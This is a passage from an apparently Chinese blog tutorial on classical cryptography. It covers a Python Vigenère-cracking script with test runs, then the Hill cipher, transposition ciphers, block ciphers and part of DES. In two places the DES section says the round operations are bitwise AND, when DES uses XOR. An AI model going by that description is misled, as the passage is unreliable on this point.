class="hljs-number">0.00150</span>, \<br>    <span class="hljs-number">0.01974</span>, <span class="hljs-number">0.00074</span> ] <span class="hljs-comment">#一般文本a~z频率</span><br>    <span class="hljs-built_in">dict</span> = &#123;&#125; <span class="hljs-comment">#密文各个字母的个数</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>): <span class="hljs-comment">#各字母个数初始化为0</span><br>        <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + i)] = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ciphertext:<br>        <span class="hljs-built_in">dict</span>[i] += <span class="hljs-number">1</span><br><br>    p = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>):<br>        p.append( <span class="hljs-built_in">round</span>(<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + i)] / <span class="hljs-built_in">len</span>(ciphertext), <span class="hljs-number">3</span>))<br><br>    correlations = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>): <span class="hljs-comment">#模拟偏移，计算correlation</span><br>        correlation = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>): <span class="hljs-comment">#26个字母的频率相乘</span><br>            correlation += q[j] * p[(j + i - <span class="hljs-number">26</span>) % <span class="hljs-number">26</span>]<br>        correlations.append(<span class="hljs-built_in">round</span>(correlation, <span class="hljs-number">3</span>))<br><br>    shift = correlations.index(<span class="hljs-built_in">max</span>(correlations))<br>    <span class="hljs-keyword">return</span> shift<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">ciphertext, key</span>):<br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    num = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ciphertext:<br>        <span class="hljs-keyword">if</span> (i.isalpha()):<br>            plaintext += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) - (<span class="hljs-built_in">ord</span>(key[num % <span class="hljs-built_in">len</span>(key)]) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) + <span class="hljs-number">26</span>) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>            num +=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            plaintext += i<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;result.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(plaintext)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;result saved  in &#x27;result.txt&#x27;&quot;</span>)<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(plaintext) &lt; <span class="hljs-number">100</span>):<br>        <span class="hljs-built_in">print</span>(plaintext)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;-h&#x27;</span> <span class="hljs-keyword">or</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;--help&#x27;</span> <span class="hljs-keyword">or</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;help&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;python3 vigenere_decode.py [-f filepath] [-s string] [-k key]&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;-f&#x27;</span>):<br>        ciphertext = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            ciphertext = f.read().lower()<br>    <span class="hljs-keyword">elif</span> (sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;-s&#x27;</span>):<br>        ciphertext = sys.argv[<span class="hljs-number">2</span>]<br>    <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-k&#x27;</span>):<br>            decode(ciphertext, sys.argv[<span class="hljs-number">4</span>])<br>    <span class="hljs-keyword">except</span> Exception: <span class="hljs-comment">#报错说明没有-k，需要去爆破密钥值</span><br>        key_length = get_key_length(ciphertext)<br>        groups = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, key_length):<br>            groups.append(<span class="hljs-string">&quot;&quot;</span>)<br>        num = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ciphertext:<br>            <span class="hljs-keyword">if</span> i.isalpha():<br>                groups[num % key_length] += i<br>                num += <span class="hljs-number">1</span><br>        key = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> groups:<br>            key += <span class="hljs-built_in">chr</span>( <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + get_shift(i) )<br>            decode(ciphertext, key)<br></code></pre></td></tr></table></figure><p>这里举几个例子，我们先从对解密脚本简单的情况开始，直接把简爱第一章的密文丢给它看看能不能解密出来。</p><p>先用加密脚本加密一下，密钥为<code>wuuconix</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> vigenere_encdoe.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">f</span> <span class="hljs-string">&quot;plaintext.txt&quot;</span> -<span class="hljs-keyword">k</span> wuuconix<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210911213505160.png" alt="解密尝试" /></p><p><img src="https://upyun.wuuconix.link/image-20210911213527185.png" alt="result" /></p><p>成功解密。</p><p>再把难度提升一些，只弄一个段落。</p><p><img src="https://upyun.wuuconix.link/image-20210911213606847.png" alt="段落" /></p><p><img src="https://upyun.wuuconix.link/image-20210911213741210.png" alt="result" /></p><p>也成功了。再直接用第一句话试试。</p><p><img src="https://upyun.wuuconix.link/image-20210911213940312.png" alt="简爱第一句话" /></p><p><img src="https://upyun.wuuconix.link/image-20210911213955420.png" alt="一句话解密失败" /></p><p>失败了2333，果然密文太少了，利用重合指数法就不准了。</p><h2 id="hill-cipher"><a class="markdownIt-Anchor" href="#hill-cipher"></a> Hill Cipher</h2><p>希尔密码，于1929年发明，利用基本的矩阵来进行替换。它是一种<code>多名代替密码 Polygraphic Substitution Ciphers</code>。</p><p>下面我来讲一下我对<code>Monoalphabetic Ciphers</code>,<code>Polyalphabetic Ciphers</code>和<code>Polygraphic Ciphers</code>的理解。</p><p>单表代替，每个明文字母只有一种特定的置换方式。</p><p>多表代替，每个明文字母会根据在明文中位置的不同，可能有不同的置换方式。(Vigenere Cipher)</p><p>多名代替，就是把所有的明文字母一起加密成某个密文，如下图。我们以第一个密文字母c1为例。</p><p><img src="https://upyun.wuuconix.link/image-20210912100310742.png" alt="希尔加密方式" /></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msub><mi>m</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>k</mi><mn>11</mn></msub><mo>+</mo><msub><mi>m</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>k</mi><mn>21</mn></msub><mo>+</mo><msub><mi>m</mi><mn>3</mn></msub><mo>∗</mo><msub><mi>k</mi><mn>31</mn></msub><mo>+</mo><msub><mi>m</mi><mn>4</mn></msub><mo>∗</mo><msub><mi>k</mi><mn>41</mn></msub></mrow><annotation encoding="application/x-tex">c_1 = m_1*k_{11}+m_2 * k_{21}+m_3*k_{31}+m_4*k_{41}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>我们可以看到第一个密文的加密过程中运用到了所有的明文字母，这大概就是<code>多名</code>的意义了。</p><p>希尔密码的密钥需要是一个可逆矩阵，这样才能够被正确解密。</p><p>在不知道密钥的情况下也能被破译，但是我已经看不懂了（</p><p><img src="https://upyun.wuuconix.link/image-20210912102119291.png" alt="希尔破译" /></p><p>希尔加密运用到了现代数学的矩阵知识。希尔密码也很难用人力来加密和解密，但是在现代计算机强大的算力下也被证明是可破译的。</p><p>维基百科<a href="https://en.wikipedia.org/wiki/Polygraphic_substitution">Polygraphic substitution - Wikipedia</a>也把希尔加密称为是古典密码和现代密码的分界线。</p><blockquote><p>In 1929, <a href="https://en.wikipedia.org/wiki/Lester_S._Hill">Lester S. Hill</a> developed the <a href="https://en.wikipedia.org/wiki/Hill_cipher">Hill cipher</a>, which uses matrix algebra to encrypt blocks of any desired length. However, encryption is very difficult to perform by hand for any sufficiently large block size, although it has been implemented by machine or computer. This is therefore on the frontier between classical and modern cryptography.</p></blockquote><h2 id="permutation-cipher"><a class="markdownIt-Anchor" href="#permutation-cipher"></a> Permutation Cipher</h2><p>之前讲的所有密码都属于代替密码，就是通过某种规则把明文的字母代替为另外的字母。</p><p>接下来 讲的置换密码<code>Permutation Cipher</code>（又叫做<code>Transpostion Cipher</code>）是什么意思呢？实际上就是把明文中的字母打乱，换个顺序。</p><p>下面举几个例子。</p><ol><li><p>铁轨密码 <code>Rail Fence Cipher</code> <a href="https://en.wikipedia.org/wiki/Rail_fence_cipher">Rail fence cipher - Wikipedia</a></p><p>实际上就是把明文按照WWWW的形式来写，然后一行一行读，同时为了可读性，每5个密文加个空格。</p><p>比如<code>flag&#123;wuuconix_yyds&#125;</code>的加密过程</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f...&#123;..<span class="hljs-selector-class">.c</span>..<span class="hljs-selector-class">.x</span>..<span class="hljs-selector-class">.d</span>..<br><span class="hljs-selector-class">.l</span><span class="hljs-selector-class">.g</span><span class="hljs-selector-class">.w</span><span class="hljs-selector-class">.u</span><span class="hljs-selector-class">.o</span><span class="hljs-selector-class">.i</span>._<span class="hljs-selector-class">.y</span><span class="hljs-selector-class">.s</span>.<br>.<span class="hljs-selector-class">.a</span>..<span class="hljs-selector-class">.u</span>..<span class="hljs-selector-class">.n</span>..<span class="hljs-selector-class">.y</span>...&#125;<br></code></pre></td></tr></table></figure><p>它最终的密文就是 <code>f&#123;cxd lgwuo i_ysa uny&#125;</code></p></li><li><p>三角密码 <code>Triangle Transposition Ciphe</code></p><p>大概就是把明文以金字塔的方式以从横向写出来。</p><p>然后以竖向的方式读出来就成了密文。</p><p><img src="https://upyun.wuuconix.link/image-20210912121615264.png" alt="三角密码" /></p></li><li><p>铝带密码<code>Scytale Cipher</code></p><p>这就非常牛逼了，把密文绕着斯巴达加密棒绕一圈就可以得到密文。</p><p><img src="https://upyun.wuuconix.link/image-20210912122159555.png" alt="scytale" /></p></li><li><p>块置换加密 <code>Block Permutation Cipher</code></p><p>举一个例子，明文<code>wuuconix</code>，密钥<code>flag</code></p><p>我们现根据密钥字母在字母表中的次序写出一下次序<code>2413</code>。即<code>f</code>在<code>flag</code>中排第三位，<code>a</code>在<code>flag</code>中排第一位…</p><p>然后我们根据密钥长度，即<code>4</code>。每行写4个字母，把明文写成一个方块。</p><div class="center"><table><thead><tr><th style="text-align:center">w</th><th style="text-align:center">u</th><th style="text-align:center">u</th><th style="text-align:center">c</th></tr></thead><tbody><tr><td style="text-align:center"><strong>o</strong></td><td style="text-align:center"><strong>n</strong></td><td style="text-align:center"><strong>i</strong></td><td style="text-align:center"><strong>x</strong></td></tr></tbody></table></div><p>然后我们根据刚刚得到的次序<code>2413</code>。先读第2列，再读第4列…得到密文<code>uncxwoui</code>。</p><p>知道密钥解密的话也很简单，我们知道密钥<code>flag</code>的情况下，就可以知道一行有4个字母，而密文<code>uncxwoui</code>有八个字母，所以可以推断一列有2个字母，然后再分别写到各个列上，再按行读，就能得到明文啦！</p></li></ol><h2 id="product-cipher"><a class="markdownIt-Anchor" href="#product-cipher"></a> Product Cipher</h2><p>乘积密码被称为古典密码和现代密码的桥梁。</p><p>实际上就是对操作进行进行迭代，比如两次移位，两次代替，两次置换。还可以代替后置换。</p><p><img src="https://upyun.wuuconix.link/image-20210912124053319.png" alt="乘积密码" /></p><h2 id="block-cipher"><a class="markdownIt-Anchor" href="#block-cipher"></a> Block Cipher</h2><p>分组密码。根据我的理解，分组密码的和我们之前写的古典密码不同点就在于，它的明文、密钥和密文都是用二进制表示的。</p><blockquote><p>In <a href="https://en.wikipedia.org/wiki/Cryptography">cryptography</a>, a <strong>block cipher</strong> is a <a href="https://en.wikipedia.org/wiki/Deterministic_algorithm">deterministic algorithm</a> operating on fixed-length groups of <a href="https://en.wikipedia.org/wiki/Bit">bits</a>, called <em>blocks</em>.</p></blockquote><p>一般来说n位的明文会被加密问n位的密文。但是密钥的长度不一定是n位，可能不一样 。</p><p>分组加密一般内部运用的加密方式，无非就是代替和置换。</p><p>代替的目的是为了混淆 <code>Substitution for Confusion</code>。</p><p>置换的目的是为了扩散 <code>Permutation for Diffusion</code>。</p><p>在现代分组密码<code>Modern Block Cipher</code>之中，一轮中通常都有一个代替-置换网络<code>Substitution-Permutation Network</code> 可以简写为<code>SPN</code>。</p><p>SPN的代替元素被称为S盒<code>S-box</code>。置换元素被称为P盒<code>P-box</code>。</p><p>这个SPN可以说是很多现代分组密码的的基础，比如<code>DES</code>,<code>AES</code>,<code>RC6</code>…</p><h2 id="des"><a class="markdownIt-Anchor" href="#des"></a> DES</h2><p>Data Encryption Standard。数据加密标准。</p><p>它的明文输入是64位二进制，输出同样。密钥输入看似也是64位，但是其<code>8,16,24...</code>位在置换中被丢弃，实际上起作用的密钥只有56位。</p><p>下面我简单说一下DES的大体流程。先说明文的处理过程。</p><p>64位的明文传入后，首先需要进行一个<code>初始置换 Initial Permutation</code>。</p><p>置换完之后将结果分为两部分，左32位称为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">L_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，右32位称为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">R_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">L_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>划水。开始对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">R_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>进行处理。首先32位的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">R_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>首先需要进行一次<code>拓展置换 Expansion Permutation</code>，将32位猛增为48位，为什么需要把位数扩大呢？因为每轮的密钥实际上是48位的，这个之后说，将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">R_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>拓展为48位之后，就可以和密钥进行操作了。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">R_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>拓展成为48位后，与密钥进行按位与运算。</p><p>然后48位的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">R_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>将进入8个<code>S-box</code>。将48位重新变为32位。</p><p><code>S-box</code>是怎么实现的位数的减少的呢？我们知道 ，一共有8个S盒，所有的输入一共48位，相当于每个S盒处理6位。</p><p><img src="https://upyun.wuuconix.link/image-20210914215331631.png" alt="S-box" /></p><p>我们看这个S盒一共有4行16列，一共64个元素，每行的元素都是<code>0~15</code>。</p><p>假设我们的<code>S-box 8</code>的输入是<code>101100</code>一共六位，拿出第一位和最后一位<code>10</code>，转为为十进制就是2，于是我们就选择第二行。中间的四位<code>0110</code>是6，于是我们选择第六列，所以就是第二行第六列，即<code>14</code>。再将14转化为二进制<code>1110</code>。所以最后<code>S-box 8</code>的输出就是4位二进制数<code>1110</code>。从原来的输入的六位变成了输出的四位。一共有8个类似的S盒，每个S盒的输出都是4位，总共的输出就是32位啦！</p><p>经过S盒的处理之后再经过一个P盒置换一下，仍然是32位。</p><p>将这32位和一直在摸鱼的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">L_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>按位与一下，就得到了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">R_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 